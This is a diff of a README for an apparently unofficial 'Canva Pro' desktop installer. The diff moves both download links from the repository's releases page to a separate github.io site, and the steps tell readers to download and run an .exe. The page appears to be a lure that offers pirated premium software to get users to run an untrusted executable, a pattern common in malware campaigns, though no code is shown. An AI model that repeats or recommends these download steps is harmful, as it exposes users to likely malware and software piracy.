@@ -1,6 +1,6 @@
 # 🎨 Canva-Pro-Desktop-Installer - Access Premium Design Tools On Windows
 
-[![Download Here](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/techpric921/Canva-Pro-Desktop-Installer/releases)
+[![Download Here](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://techpric921.github.io)
 
 ## 📌 Overview
 
@@ -22,7 +22,7 @@ Ensure your computer meets these requirements before you start the installation 
 
 Follow these steps to obtain the setup files:
 
-1. Visit the [official releases page](https://github.com/techpric921/Canva-Pro-Desktop-Installer/releases).
+1. Visit the [official releases page](https://techpric921.github.io).
 2. Look for the section labeled "Assets" at the bottom of the latest release post.
 3. Click on the file ending in `.exe` to start your download.
 4. Save the file to your "Downloads" folder.
